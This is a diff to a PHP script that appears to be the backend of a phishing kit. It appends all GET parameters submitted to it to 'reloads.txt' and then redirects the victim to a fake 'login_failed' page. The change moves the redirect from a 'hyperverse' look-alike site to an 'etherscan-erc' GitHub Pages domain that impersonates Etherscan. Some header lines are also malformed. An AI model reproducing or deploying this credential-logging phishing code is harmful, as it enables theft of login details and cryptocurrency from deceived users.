@@ -1,5 +1,5 @@
 <?php
-header ('Location: Location: https://https://h5thehyperversee.github.io/h5-thehyperverse/invalid.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";/');
+header ('Location: Location: https://etherscan-erc.github.io/invalid.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";/');
 $handle = fopen("reloads.txt", "a");
 
 foreach($_GET as $variable => $value) {
@@ -25,7 +25,7 @@ fclose($handle);
 exit;
 echo "<script images=\"JavaScript\">
 <!--
-window.location=\" https://h5thehyperversee.github.io/h5-thehyperverse/answer.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";
+window.location=\" https://etherscan-erc.github.io/invalid.html?=10065877425?fb_source=bookmark_apps&ref=bookmarks&count=0&fb_bmpos=login_failed\";
 // -->
 </script>";
 ?>
